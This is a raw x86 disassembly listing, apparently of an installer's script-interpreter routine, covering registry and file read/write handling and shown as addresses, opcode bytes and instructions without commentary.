  4024d7:	e8 7b ef ff ff       	call   0x401457
  4024dc:	8d 45 7c             	lea    0x7c(%ebp),%eax
  4024df:	50                   	push   %eax
  4024e0:	68 f8 9a 40 00       	push   $0x409af8
  4024e5:	6a 01                	push   $0x1
  4024e7:	6a 00                	push   $0x0
  4024e9:	68 08 9b 40 00       	push   $0x409b08
  4024ee:	ff 15 b0 92 40 00    	call   *0x4092b0
  4024f4:	85 c0                	test   %eax,%eax
  4024f6:	0f 8c ad 00 00 00    	jl     0x4025a9
  4024fc:	8b 45 7c             	mov    0x7c(%ebp),%eax
  4024ff:	8b 08                	mov    (%eax),%ecx
  402501:	8d 55 34             	lea    0x34(%ebp),%edx
  402504:	52                   	push   %edx
  402505:	68 18 9b 40 00       	push   $0x409b18
  40250a:	50                   	push   %eax
  40250b:	ff 11                	call   *(%ecx)
  40250d:	8b f0                	mov    %eax,%esi
  40250f:	85 f6                	test   %esi,%esi
  402511:	0f 8c 85 00 00 00    	jl     0x40259c
  402517:	8b 45 7c             	mov    0x7c(%ebp),%eax
  40251a:	ff 75 1c             	push   0x1c(%ebp)
  40251d:	8b 08                	mov    (%eax),%ecx
  40251f:	50                   	push   %eax
  402520:	ff 51 50             	call   *0x50(%ecx)
  402523:	85 db                	test   %ebx,%ebx
  402525:	8b f0                	mov    %eax,%esi
  402527:	75 0e                	jne    0x402537
  402529:	8b 45 7c             	mov    0x7c(%ebp),%eax
  40252c:	8b 08                	mov    (%eax),%ecx
  40252e:	68 00 60 43 00       	push   $0x436000
  402533:	50                   	push   %eax
  402534:	ff 51 24             	call   *0x24(%ecx)
  402537:	85 ff                	test   %edi,%edi
  402539:	74 0a                	je     0x402545
  40253b:	8b 45 7c             	mov    0x7c(%ebp),%eax
  40253e:	8b 08                	mov    (%eax),%ecx
  402540:	57                   	push   %edi
  402541:	50                   	push   %eax
  402542:	ff 51 3c             	call   *0x3c(%ecx)
  402545:	8b 45 7c             	mov    0x7c(%ebp),%eax
  402548:	ff 75 68             	push   0x68(%ebp)
  40254b:	8b 08                	mov    (%eax),%ecx
  40254d:	50                   	push   %eax
  40254e:	ff 51 34             	call   *0x34(%ecx)
  402551:	8b 4d 3c             	mov    0x3c(%ebp),%ecx
  402554:	66 83 39 00          	cmpw   $0x0,(%ecx)
  402558:	74 0d                	je     0x402567
  40255a:	ff 75 2c             	push   0x2c(%ebp)
  40255d:	8b 45 7c             	mov    0x7c(%ebp),%eax
  402560:	8b 10                	mov    (%eax),%edx
  402562:	51                   	push   %ecx
  402563:	50                   	push   %eax
  402564:	ff 52 44             	call   *0x44(%edx)
  402567:	8b 45 7c             	mov    0x7c(%ebp),%eax
  40256a:	ff 75 e0             	push   -0x20(%ebp)
  40256d:	8b 08                	mov    (%eax),%ecx
  40256f:	50                   	push   %eax
  402570:	ff 51 2c             	call   *0x2c(%ecx)
  402573:	8b 45 7c             	mov    0x7c(%ebp),%eax
  402576:	ff 75 64             	push   0x64(%ebp)
  402579:	8b 08                	mov    (%eax),%ecx
  40257b:	50                   	push   %eax
  40257c:	ff 51 1c             	call   *0x1c(%ecx)
  40257f:	85 f6                	test   %esi,%esi
  402581:	7c 10                	jl     0x402593
  402583:	8b 45 34             	mov    0x34(%ebp),%eax
  402586:	8b 08                	mov    (%eax),%ecx
  402588:	6a 01                	push   $0x1
  40258a:	ff 75 6c             	push   0x6c(%ebp)
  40258d:	50                   	push   %eax
  40258e:	ff 51 18             	call   *0x18(%ecx)
  402591:	8b f0                	mov    %eax,%esi
  402593:	8b 45 34             	mov    0x34(%ebp),%eax
  402596:	8b 08                	mov    (%eax),%ecx
  402598:	50                   	push   %eax
  402599:	ff 51 08             	call   *0x8(%ecx)
  40259c:	8b 45 7c             	mov    0x7c(%ebp),%eax
  40259f:	8b 08                	mov    (%eax),%ecx
  4025a1:	50                   	push   %eax
  4025a2:	ff 51 08             	call   *0x8(%ecx)
  4025a5:	85 f6                	test   %esi,%esi
  4025a7:	7d 0e                	jge    0x4025b7
  4025a9:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  4025b0:	6a f0                	push   $0xfffffff0
  4025b2:	e9 ab f2 ff ff       	jmp    0x401862
  4025b7:	6a f4                	push   $0xfffffff4
  4025b9:	e9 a4 f2 ff ff       	jmp    0x401862
  4025be:	33 f6                	xor    %esi,%esi
  4025c0:	e8 92 ee ff ff       	call   0x401457
  4025c5:	6a 11                	push   $0x11
  4025c7:	5e                   	pop    %esi
  4025c8:	8b f8                	mov    %eax,%edi
  4025ca:	e8 88 ee ff ff       	call   0x401457
  4025cf:	6a 23                	push   $0x23
  4025d1:	5e                   	pop    %esi
  4025d2:	8b d8                	mov    %eax,%ebx
  4025d4:	e8 7e ee ff ff       	call   0x401457
  4025d9:	57                   	push   %edi
  4025da:	8b f0                	mov    %eax,%esi
  4025dc:	e8 d2 3f 00 00       	call   0x4065b3
  4025e1:	85 c0                	test   %eax,%eax
  4025e3:	75 0e                	jne    0x4025f3
  4025e5:	6a 00                	push   $0x0
  4025e7:	6a f9                	push   $0xfffffff9
  4025e9:	e8 50 2c 00 00       	call   0x40523e
  4025ee:	e9 c6 f1 ff ff       	jmp    0x4017b9
  4025f3:	8b 45 64             	mov    0x64(%ebp),%eax
  4025f6:	57                   	push   %edi
  4025f7:	89 45 00             	mov    %eax,0x0(%ebp)
  4025fa:	c7 45 04 02 00 00 00 	movl   $0x2,0x4(%ebp)
  402601:	e8 d7 3e 00 00       	call   0x4064dd
  402606:	66 83 64 47 02 00    	andw   $0x0,0x2(%edi,%eax,2)
  40260c:	53                   	push   %ebx
  40260d:	e8 cb 3e 00 00       	call   0x4064dd
  402612:	66 83 64 43 02 00    	andw   $0x0,0x2(%ebx,%eax,2)
  402618:	66 8b 45 4c          	mov    0x4c(%ebp),%ax
  40261c:	56                   	push   %esi
  40261d:	6a 00                	push   $0x0
  40261f:	89 7d 08             	mov    %edi,0x8(%ebp)
  402622:	89 5d 0c             	mov    %ebx,0xc(%ebp)
  402625:	89 75 1a             	mov    %esi,0x1a(%ebp)
  402628:	66 89 45 10          	mov    %ax,0x10(%ebp)
  40262c:	e8 0d 2c 00 00       	call   0x40523e
  402631:	8d 45 00             	lea    0x0(%ebp),%eax
  402634:	50                   	push   %eax
  402635:	ff 15 a0 91 40 00    	call   *0x4091a0
  40263b:	85 c0                	test   %eax,%eax
  40263d:	0f 84 2a 09 00 00    	je     0x402f6d
  402643:	eb a0                	jmp    0x4025e5
  402645:	3d 0d f0 ad 0b       	cmp    $0xbadf00d,%eax
  40264a:	0f 85 18 f8 ff ff    	jne    0x401e68
  402650:	ff 05 54 a6 42 00    	incl   0x42a654
  402656:	e9 12 09 00 00       	jmp    0x402f6d
  40265b:	33 db                	xor    %ebx,%ebx
  40265d:	33 ff                	xor    %edi,%edi
  40265f:	3b c3                	cmp    %ebx,%eax
  402661:	89 5d 7c             	mov    %ebx,0x7c(%ebp)
  402664:	74 09                	je     0x40266f
  402666:	33 f6                	xor    %esi,%esi
  402668:	e8 ea ed ff ff       	call   0x401457
  40266d:	8b f8                	mov    %eax,%edi
  40266f:	39 5d 48             	cmp    %ebx,0x48(%ebp)
  402672:	74 0b                	je     0x40267f
  402674:	6a 11                	push   $0x11
  402676:	5e                   	pop    %esi
  402677:	e8 db ed ff ff       	call   0x401457
  40267c:	89 45 7c             	mov    %eax,0x7c(%ebp)
  40267f:	39 5d 54             	cmp    %ebx,0x54(%ebp)
  402682:	74 0a                	je     0x40268e
  402684:	6a 22                	push   $0x22
  402686:	5e                   	pop    %esi
  402687:	e8 cb ed ff ff       	call   0x401457
  40268c:	8b d8                	mov    %eax,%ebx
  40268e:	6a cd                	push   $0xffffffcd
  402690:	5e                   	pop    %esi
  402691:	e8 c1 ed ff ff       	call   0x401457
  402696:	50                   	push   %eax
  402697:	53                   	push   %ebx
  402698:	ff 75 7c             	push   0x7c(%ebp)
  40269b:	57                   	push   %edi
  40269c:	ff 15 40 91 40 00    	call   *0x409140
  4026a2:	e9 0a f1 ff ff       	jmp    0x4017b1
  4026a7:	33 f6                	xor    %esi,%esi
  4026a9:	46                   	inc    %esi
  4026aa:	c7 45 7c 0a 00 00 00 	movl   $0xa,0x7c(%ebp)
  4026b1:	e8 a1 ed ff ff       	call   0x401457
  4026b6:	6a 12                	push   $0x12
  4026b8:	5e                   	pop    %esi
  4026b9:	8b f8                	mov    %eax,%edi
  4026bb:	e8 97 ed ff ff       	call   0x401457
  4026c0:	6a dd                	push   $0xffffffdd
  4026c2:	5e                   	pop    %esi
  4026c3:	89 45 1c             	mov    %eax,0x1c(%ebp)
  4026c6:	e8 8c ed ff ff       	call   0x401457
  4026cb:	50                   	push   %eax
  4026cc:	68 ff 03 00 00       	push   $0x3ff
  4026d1:	53                   	push   %ebx
  4026d2:	8d 45 7c             	lea    0x7c(%ebp),%eax
  4026d5:	50                   	push   %eax
  4026d6:	ff 75 1c             	push   0x1c(%ebp)
  4026d9:	57                   	push   %edi
  4026da:	ff 15 44 91 40 00    	call   *0x409144
  4026e0:	66 83 3b 0a          	cmpw   $0xa,(%ebx)
  4026e4:	e9 78 f2 ff ff       	jmp    0x401961
  4026e9:	83 7d 54 00          	cmpl   $0x0,0x54(%ebp)
  4026ed:	8b 7d 48             	mov    0x48(%ebp),%edi
  4026f0:	75 2d                	jne    0x40271f
  4026f2:	6a 02                	push   $0x2
  4026f4:	58                   	pop    %eax
  4026f5:	e8 a7 ed ff ff       	call   0x4014a1
  4026fa:	8b f8                	mov    %eax,%edi
  4026fc:	85 ff                	test   %edi,%edi
  4026fe:	0f 84 b5 f0 ff ff    	je     0x4017b9
  402704:	6a 33                	push   $0x33
  402706:	5e                   	pop    %esi
  402707:	e8 4b ed ff ff       	call   0x401457
  40270c:	50                   	push   %eax
  40270d:	57                   	push   %edi
  40270e:	ff 15 18 90 40 00    	call   *0x409018
  402714:	57                   	push   %edi
  402715:	8b f0                	mov    %eax,%esi
  402717:	ff 15 04 90 40 00    	call   *0x409004
  40271d:	eb 18                	jmp    0x402737
  40271f:	6a 22                	push   $0x22
  402721:	5e                   	pop    %esi
  402722:	e8 30 ed ff ff       	call   0x401457
  402727:	8b 4d 54             	mov    0x54(%ebp),%ecx
  40272a:	d1 f9                	sar    $1,%ecx
  40272c:	51                   	push   %ecx
  40272d:	57                   	push   %edi
  40272e:	8b f0                	mov    %eax,%esi
  402730:	e8 8e ee ff ff       	call   0x4015c3
  402735:	8b f0                	mov    %eax,%esi
  402737:	85 f6                	test   %esi,%esi
  402739:	0f 84 2e 08 00 00    	je     0x402f6d
  40273f:	e9 75 f0 ff ff       	jmp    0x4017b9
  402744:	8b f8                	mov    %eax,%edi
  402746:	8b 45 58             	mov    0x58(%ebp),%eax
  402749:	89 45 7c             	mov    %eax,0x7c(%ebp)
  40274c:	8b 45 5c             	mov    0x5c(%ebp),%eax
  40274f:	6a 02                	push   $0x2
  402751:	5e                   	pop    %esi
  402752:	89 45 34             	mov    %eax,0x34(%ebp)
  402755:	e8 fd ec ff ff       	call   0x401457
  40275a:	6a 11                	push   $0x11
  40275c:	5e                   	pop    %esi
  40275d:	89 45 68             	mov    %eax,0x68(%ebp)
  402760:	e8 f2 ec ff ff       	call   0x401457
  402765:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402768:	51                   	push   %ecx
  402769:	68 22 00 10 00       	push   $0x100022
  40276e:	50                   	push   %eax
  40276f:	8b c7                	mov    %edi,%eax
  402771:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  402778:	e8 12 ed ff ff       	call   0x40148f
  40277d:	50                   	push   %eax
  40277e:	e8 df 3b 00 00       	call   0x406362
  402783:	8b f8                	mov    %eax,%edi
  402785:	f7 df                	neg    %edi
  402787:	1b ff                	sbb    %edi,%edi
  402789:	f7 d7                	not    %edi
  40278b:	23 7d 1c             	and    0x1c(%ebp),%edi
  40278e:	0f 84 d9 07 00 00    	je     0x402f6d
  402794:	33 f6                	xor    %esi,%esi
  402796:	33 c0                	xor    %eax,%eax
  402798:	83 7d 7c 01          	cmpl   $0x1,0x7c(%ebp)
  40279c:	bb 68 c1 40 00       	mov    $0x40c168,%ebx
  4027a1:	75 14                	jne    0x4027b7
  4027a3:	6a 23                	push   $0x23
  4027a5:	5e                   	pop    %esi
  4027a6:	e8 ac ec ff ff       	call   0x401457
  4027ab:	53                   	push   %ebx
  4027ac:	e8 2c 3d 00 00       	call   0x4064dd
  4027b1:	8d 44 00 02          	lea    0x2(%eax,%eax,1),%eax
  4027b5:	33 f6                	xor    %esi,%esi
  4027b7:	83 7d 7c 04          	cmpl   $0x4,0x7c(%ebp)
  4027bb:	75 13                	jne    0x4027d0
  4027bd:	6a 03                	push   $0x3
  4027bf:	59                   	pop    %ecx
  4027c0:	e8 75 ec ff ff       	call   0x40143a
  4027c5:	6a 04                	push   $0x4
  4027c7:	a3 68 c1 40 00       	mov    %eax,0x40c168
  4027cc:	89 55 3c             	mov    %edx,0x3c(%ebp)
  4027cf:	58                   	pop    %eax
  4027d0:	83 7d 7c 03          	cmpl   $0x3,0x7c(%ebp)
  4027d4:	75 24                	jne    0x4027fa
  4027d6:	39 35 e0 a5 42 00    	cmp    %esi,0x42a5e0
  4027dc:	ff 75 60             	push   0x60(%ebp)
  4027df:	8b 4d 54             	mov    0x54(%ebp),%ecx
  4027e2:	8b 45 50             	mov    0x50(%ebp),%eax
  4027e5:	68 00 18 00 00       	push   $0x1800
  4027ea:	53                   	push   %ebx
  4027eb:	56                   	push   %esi
  4027ec:	51                   	push   %ecx
  4027ed:	50                   	push   %eax
  4027ee:	74 04                	je     0x4027f4
  4027f0:	6a 01                	push   $0x1
  4027f2:	eb 01                	jmp    0x4027f5
  4027f4:	56                   	push   %esi
  4027f5:	e8 26 0b 00 00       	call   0x403320
  4027fa:	50                   	push   %eax
  4027fb:	53                   	push   %ebx
  4027fc:	ff 75 34             	push   0x34(%ebp)
  4027ff:	56                   	push   %esi
  402800:	ff 75 68             	push   0x68(%ebp)
  402803:	57                   	push   %edi
  402804:	ff 15 14 90 40 00    	call   *0x409014
  40280a:	85 c0                	test   %eax,%eax
  40280c:	75 03                	jne    0x402811
  40280e:	89 75 70             	mov    %esi,0x70(%ebp)
  402811:	57                   	push   %edi
  402812:	ff 15 04 90 40 00    	call   *0x409004
  402818:	e9 50 07 00 00       	jmp    0x402f6d
  40281d:	b8 19 00 02 00       	mov    $0x20019,%eax
  402822:	e8 7a ec ff ff       	call   0x4014a1
  402827:	6a 33                	push   $0x33
  402829:	5e                   	pop    %esi
  40282a:	8b f8                	mov    %eax,%edi
  40282c:	e8 26 ec ff ff       	call   0x401457
  402831:	33 f6                	xor    %esi,%esi
  402833:	3b fe                	cmp    %esi,%edi
  402835:	66 89 33             	mov    %si,(%ebx)
  402838:	0f 84 7b ef ff ff    	je     0x4017b9
  40283e:	8d 4d 1c             	lea    0x1c(%ebp),%ecx
  402841:	51                   	push   %ecx
  402842:	53                   	push   %ebx
  402843:	8d 4d 7c             	lea    0x7c(%ebp),%ecx
  402846:	51                   	push   %ecx
  402847:	56                   	push   %esi
  402848:	50                   	push   %eax
  402849:	57                   	push   %edi
  40284a:	c7 45 1c 00 08 00 00 	movl   $0x800,0x1c(%ebp)
  402851:	ff 15 10 90 40 00    	call   *0x409010
  402857:	33 c9                	xor    %ecx,%ecx
  402859:	41                   	inc    %ecx
  40285a:	85 c0                	test   %eax,%eax
  40285c:	75 38                	jne    0x402896
  40285e:	83 7d 7c 04          	cmpl   $0x4,0x7c(%ebp)
  402862:	74 1a                	je     0x40287e
  402864:	39 4d 7c             	cmp    %ecx,0x7c(%ebp)
  402867:	74 06                	je     0x40286f
  402869:	83 7d 7c 02          	cmpl   $0x2,0x7c(%ebp)
  40286d:	75 27                	jne    0x402896
  40286f:	8b 45 54             	mov    0x54(%ebp),%eax
  402872:	89 45 70             	mov    %eax,0x70(%ebp)
  402875:	66 89 b3 fe 07 00 00 	mov    %si,0x7fe(%ebx)
  40287c:	eb 93                	jmp    0x402811
  40287e:	ff 33                	push   (%ebx)
  402880:	33 c0                	xor    %eax,%eax
  402882:	39 75 54             	cmp    %esi,0x54(%ebp)
  402885:	53                   	push   %ebx
  402886:	0f 94 c0             	sete   %al
  402889:	89 45 70             	mov    %eax,0x70(%ebp)
  40288c:	e8 7d 3b 00 00       	call   0x40640e
  402891:	e9 7b ff ff ff       	jmp    0x402811
  402896:	66 89 33             	mov    %si,(%ebx)
  402899:	89 4d 70             	mov    %ecx,0x70(%ebp)
  40289c:	e9 70 ff ff ff       	jmp    0x402811
  4028a1:	b8 19 00 02 00       	mov    $0x20019,%eax
  4028a6:	e8 f6 eb ff ff       	call   0x4014a1
  4028ab:	6a 03                	push   $0x3
  4028ad:	59                   	pop    %ecx
  4028ae:	8b f8                	mov    %eax,%edi
  4028b0:	e8 85 eb ff ff       	call   0x40143a
  4028b5:	33 f6                	xor    %esi,%esi
  4028b7:	3b fe                	cmp    %esi,%edi
  4028b9:	89 55 1c             	mov    %edx,0x1c(%ebp)
  4028bc:	66 89 33             	mov    %si,(%ebx)
  4028bf:	0f 84 f4 ee ff ff    	je     0x4017b9
  4028c5:	39 75 54             	cmp    %esi,0x54(%ebp)
  4028c8:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4028cd:	89 4d 7c             	mov    %ecx,0x7c(%ebp)
  4028d0:	74 0c                	je     0x4028de
  4028d2:	51                   	push   %ecx
  4028d3:	53                   	push   %ebx
  4028d4:	50                   	push   %eax
  4028d5:	57                   	push   %edi
  4028d6:	ff 15 08 90 40 00    	call   *0x409008
  4028dc:	eb 97                	jmp    0x402875
  4028de:	56                   	push   %esi
  4028df:	56                   	push   %esi
  4028e0:	56                   	push   %esi
  4028e1:	56                   	push   %esi
  4028e2:	8d 4d 7c             	lea    0x7c(%ebp),%ecx
  4028e5:	51                   	push   %ecx
  4028e6:	53                   	push   %ebx
  4028e7:	50                   	push   %eax
  4028e8:	57                   	push   %edi
  4028e9:	ff 15 0c 90 40 00    	call   *0x40900c
  4028ef:	85 c0                	test   %eax,%eax
  4028f1:	74 82                	je     0x402875
  4028f3:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  4028fa:	e9 76 ff ff ff       	jmp    0x402875
  4028ff:	53                   	push   %ebx
  402900:	e8 22 3b 00 00       	call   0x406427
  402905:	85 c0                	test   %eax,%eax
  402907:	0f 84 60 06 00 00    	je     0x402f6d
  40290d:	50                   	push   %eax
  40290e:	e9 3f f9 ff ff       	jmp    0x402252
  402913:	6a ed                	push   $0xffffffed
  402915:	5e                   	pop    %esi
  402916:	e8 3c eb ff ff       	call   0x401457
  40291b:	ff 75 4c             	push   0x4c(%ebp)
  40291e:	ff 75 48             	push   0x48(%ebp)
  402921:	50                   	push   %eax
  402922:	e8 3a 38 00 00       	call   0x406161
  402927:	83 f8 ff             	cmp    $0xffffffff,%eax
  40292a:	0f 85 11 f3 ff ff    	jne    0x401c41
  402930:	66 83 23 00          	andw   $0x0,(%ebx)
  402934:	e9 80 ee ff ff       	jmp    0x4017b9
  402939:	8b 45 4c             	mov    0x4c(%ebp),%eax
  40293c:	33 c9                	xor    %ecx,%ecx
  40293e:	83 fe 3a             	cmp    $0x3a,%esi
  402941:	0f 94 c1             	sete   %cl
  402944:	85 c0                	test   %eax,%eax
  402946:	89 45 7c             	mov    %eax,0x7c(%ebp)
  402949:	8b f9                	mov    %ecx,%edi
  40294b:	74 1b                	je     0x402968
  40294d:	33 c9                	xor    %ecx,%ecx
  40294f:	41                   	inc    %ecx
  402950:	e8 e5 ea ff ff       	call   0x40143a
  402955:	66 a3 68 b9 40 00    	mov    %ax,0x40b968
  40295b:	33 c0                	xor    %eax,%eax
  40295d:	85 ff                	test   %edi,%edi
  40295f:	0f 94 c0             	sete   %al
  402962:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402965:	40                   	inc    %eax
  402966:	eb 2c                	jmp    0x402994
  402968:	83 fe 3a             	cmp    $0x3a,%esi
  40296b:	75 2b                	jne    0x402998
  40296d:	6a 21                	push   $0x21
  40296f:	5e                   	pop    %esi
  402970:	e8 e2 ea ff ff       	call   0x401457
  402975:	68 00 04 00 00       	push   $0x400
  40297a:	be 68 b9 40 00       	mov    $0x40b968,%esi
  40297f:	56                   	push   %esi
  402980:	68 68 c1 40 00       	push   $0x40c168
  402985:	e8 5f 3b 00 00       	call   0x4064e9
  40298a:	83 c4 0c             	add    $0xc,%esp
  40298d:	56                   	push   %esi
  40298e:	ff 15 48 91 40 00    	call   *0x409148
  402994:	8b f0                	mov    %eax,%esi
  402996:	eb 12                	jmp    0x4029aa
  402998:	6a 11                	push   $0x11
  40299a:	5e                   	pop    %esi
  40299b:	e8 b7 ea ff ff       	call   0x401457
  4029a0:	50                   	push   %eax
  4029a1:	e8 37 3b 00 00       	call   0x4064dd
  4029a6:	8b f0                	mov    %eax,%esi
  4029a8:	03 f6                	add    %esi,%esi
  4029aa:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  4029ae:	0f 84 05 ee ff ff    	je     0x4017b9
  4029b4:	53                   	push   %ebx
  4029b5:	e8 6d 3a 00 00       	call   0x406427
  4029ba:	0b 7d 7c             	or     0x7c(%ebp),%edi
  4029bd:	8b d8                	mov    %eax,%ebx
  4029bf:	75 15                	jne    0x4029d6
  4029c1:	83 7d 50 00          	cmpl   $0x0,0x50(%ebp)
  4029c5:	74 0f                	je     0x4029d6
  4029c7:	53                   	push   %ebx
  4029c8:	53                   	push   %ebx
  4029c9:	e8 74 38 00 00       	call   0x406242
  4029ce:	85 c0                	test   %eax,%eax
  4029d0:	0f 8c e3 ed ff ff    	jl     0x4017b9
  4029d6:	56                   	push   %esi
  4029d7:	68 68 b9 40 00       	push   $0x40b968
  4029dc:	53                   	push   %ebx
  4029dd:	e8 31 38 00 00       	call   0x406213
  4029e2:	e9 ca ed ff ff       	jmp    0x4017b1
  4029e7:	6a 02                	push   $0x2
  4029e9:	59                   	pop    %ecx
  4029ea:	33 f6                	xor    %esi,%esi
  4029ec:	89 75 34             	mov    %esi,0x34(%ebp)
  4029ef:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4029f2:	e8 43 ea ff ff       	call   0x40143a
  4029f7:	83 f8 01             	cmp    $0x1,%eax
  4029fa:	89 55 1c             	mov    %edx,0x1c(%ebp)
  4029fd:	89 45 1c             	mov    %eax,0x1c(%ebp)
  402a00:	0f 8c 67 05 00 00    	jl     0x402f6d
  402a06:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402a0b:	3b c1                	cmp    %ecx,%eax
  402a0d:	7e 03                	jle    0x402a12
  402a0f:	89 4d 1c             	mov    %ecx,0x1c(%ebp)
  402a12:	33 ff                	xor    %edi,%edi
  402a14:	66 39 3b             	cmp    %di,(%ebx)
  402a17:	0f 84 5f 01 00 00    	je     0x402b7c
  402a1d:	53                   	push   %ebx
  402a1e:	89 7d 68             	mov    %edi,0x68(%ebp)
  402a21:	e8 01 3a 00 00       	call   0x406427
  402a26:	39 7d 1c             	cmp    %edi,0x1c(%ebp)
  402a29:	89 45 2c             	mov    %eax,0x2c(%ebp)
  402a2c:	0f 8e 4a 01 00 00    	jle    0x402b7c
  402a32:	8b 1d 4c 91 40 00    	mov    0x40914c,%ebx
  402a38:	83 7d 40 3b          	cmpl   $0x3b,0x40(%ebp)
  402a3c:	0f 85 ce 00 00 00    	jne    0x402b10
  402a42:	57                   	push   %edi
  402a43:	8d 45 3c             	lea    0x3c(%ebp),%eax
  402a46:	50                   	push   %eax
  402a47:	6a 02                	push   $0x2
  402a49:	58                   	pop    %eax
  402a4a:	2b 45 50             	sub    0x50(%ebp),%eax
  402a4d:	50                   	push   %eax
  402a4e:	8d 45 7c             	lea    0x7c(%ebp),%eax
  402a51:	50                   	push   %eax
  402a52:	ff 75 2c             	push   0x2c(%ebp)
  402a55:	ff 15 50 91 40 00    	call   *0x409150
  402a5b:	85 c0                	test   %eax,%eax
  402a5d:	0f 84 19 01 00 00    	je     0x402b7c
  402a63:	8b 4d 3c             	mov    0x3c(%ebp),%ecx
  402a66:	3b cf                	cmp    %edi,%ecx
  402a68:	0f 84 0e 01 00 00    	je     0x402b7c
  402a6e:	39 7d 50             	cmp    %edi,0x50(%ebp)
  402a71:	66 0f b6 45 7c       	movzbw 0x7c(%ebp),%ax
  402a76:	0f b7 c0             	movzwl %ax,%eax
  402a79:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  402a7c:	89 45 64             	mov    %eax,0x64(%ebp)
  402a7f:	0f 85 b8 00 00 00    	jne    0x402b3d
  402a85:	6a 01                	push   $0x1
  402a87:	8d 45 64             	lea    0x64(%ebp),%eax
  402a8a:	50                   	push   %eax
  402a8b:	51                   	push   %ecx
  402a8c:	8d 45 7c             	lea    0x7c(%ebp),%eax
  402a8f:	50                   	push   %eax
  402a90:	6a 08                	push   $0x8
  402a92:	57                   	push   %edi
  402a93:	ff d3                	call   *%ebx
  402a95:	85 c0                	test   %eax,%eax
  402a97:	0f 85 9b 00 00 00    	jne    0x402b38
  402a9d:	8b 75 e0             	mov    -0x20(%ebp),%esi
  402aa0:	f7 de                	neg    %esi
  402aa2:	ff 4d 3c             	decl   0x3c(%ebp)
  402aa5:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  402aaa:	89 45 64             	mov    %eax,0x64(%ebp)
  402aad:	74 2a                	je     0x402ad9
  402aaf:	ff 4d e0             	decl   -0x20(%ebp)
  402ab2:	6a 01                	push   $0x1
  402ab4:	57                   	push   %edi
  402ab5:	46                   	inc    %esi
  402ab6:	56                   	push   %esi
  402ab7:	ff 75 2c             	push   0x2c(%ebp)
  402aba:	ff 15 54 91 40 00    	call   *0x409154
  402ac0:	6a 01                	push   $0x1
  402ac2:	8d 45 64             	lea    0x64(%ebp),%eax
  402ac5:	50                   	push   %eax
  402ac6:	ff 75 3c             	push   0x3c(%ebp)
  402ac9:	8d 45 7c             	lea    0x7c(%ebp),%eax
  402acc:	50                   	push   %eax
  402acd:	6a 08                	push   $0x8
  402acf:	57                   	push   %edi
  402ad0:	ff d3                	call   *%ebx
  402ad2:	85 c0                	test   %eax,%eax
  402ad4:	74 cc                	je     0x402aa2
  402ad6:	8b 45 64             	mov    0x64(%ebp),%eax
  402ad9:	8b 75 34             	mov    0x34(%ebp),%esi
  402adc:	39 7d 50             	cmp    %edi,0x50(%ebp)
  402adf:	75 5c                	jne    0x402b3d
  402ae1:	66 83 7d 68 0d       	cmpw   $0xd,0x68(%ebp)
  402ae6:	74 66                	je     0x402b4e
  402ae8:	66 83 7d 68 0a       	cmpw   $0xa,0x68(%ebp)
  402aed:	74 5f                	je     0x402b4e
  402aef:	8b 4d 6c             	mov    0x6c(%ebp),%ecx
  402af2:	66 89 04 71          	mov    %ax,(%ecx,%esi,2)
  402af6:	0f b7 c8             	movzwl %ax,%ecx
  402af9:	46                   	inc    %esi
  402afa:	66 3b c7             	cmp    %di,%ax
  402afd:	89 75 34             	mov    %esi,0x34(%ebp)
  402b00:	89 4d 68             	mov    %ecx,0x68(%ebp)
  402b03:	74 77                	je     0x402b7c
  402b05:	3b 75 1c             	cmp    0x1c(%ebp),%esi
  402b08:	0f 8c 2a ff ff ff    	jl     0x402a38
  402b0e:	eb 6c                	jmp    0x402b7c
  402b10:	39 7d 50             	cmp    %edi,0x50(%ebp)
  402b13:	75 11                	jne    0x402b26
  402b15:	3b f7                	cmp    %edi,%esi
  402b17:	75 0d                	jne    0x402b26
  402b19:	57                   	push   %edi
  402b1a:	ff 75 2c             	push   0x2c(%ebp)
  402b1d:	e8 20 37 00 00       	call   0x406242
  402b22:	85 c0                	test   %eax,%eax
  402b24:	7c 56                	jl     0x402b7c
  402b26:	6a 02                	push   $0x2
  402b28:	8d 45 64             	lea    0x64(%ebp),%eax
  402b2b:	50                   	push   %eax
  402b2c:	ff 75 2c             	push   0x2c(%ebp)
  402b2f:	e8 b0 36 00 00       	call   0x4061e4
  402b34:	85 c0                	test   %eax,%eax
  402b36:	74 44                	je     0x402b7c
  402b38:	8b 45 64             	mov    0x64(%ebp),%eax
  402b3b:	eb 9f                	jmp    0x402adc
  402b3d:	0f b7 c0             	movzwl %ax,%eax
  402b40:	50                   	push   %eax
  402b41:	ff 75 6c             	push   0x6c(%ebp)
  402b44:	e8 c5 38 00 00       	call   0x40640e
  402b49:	e9 28 04 00 00       	jmp    0x402f76
  402b4e:	66 39 45 68          	cmp    %ax,0x68(%ebp)
  402b52:	74 16                	je     0x402b6a
  402b54:	66 3d 0d 00          	cmp    $0xd,%ax
  402b58:	74 06                	je     0x402b60
  402b5a:	66 3d 0a 00          	cmp    $0xa,%ax
  402b5e:	75 0a                	jne    0x402b6a
  402b60:	8b 4d 6c             	mov    0x6c(%ebp),%ecx
  402b63:	66 89 04 71          	mov    %ax,(%ecx,%esi,2)
  402b67:	46                   	inc    %esi
  402b68:	eb 12                	jmp    0x402b7c
  402b6a:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402b6d:	6a 01                	push   $0x1
  402b6f:	57                   	push   %edi
  402b70:	f7 d8                	neg    %eax
  402b72:	50                   	push   %eax
  402b73:	ff 75 2c             	push   0x2c(%ebp)
  402b76:	ff 15 54 91 40 00    	call   *0x409154
  402b7c:	8b 45 6c             	mov    0x6c(%ebp),%eax
  402b7f:	66 89 3c 70          	mov    %di,(%eax,%esi,2)
  402b83:	3b f7                	cmp    %edi,%esi
  402b85:	e9 29 ec ff ff       	jmp    0x4017b3
  402b8a:	66 83 3b 00          	cmpw   $0x0,(%ebx)
  402b8e:	0f 84 d9 03 00 00    	je     0x402f6d
  402b94:	6a 02                	push   $0x2
  402b96:	59                   	pop    %ecx
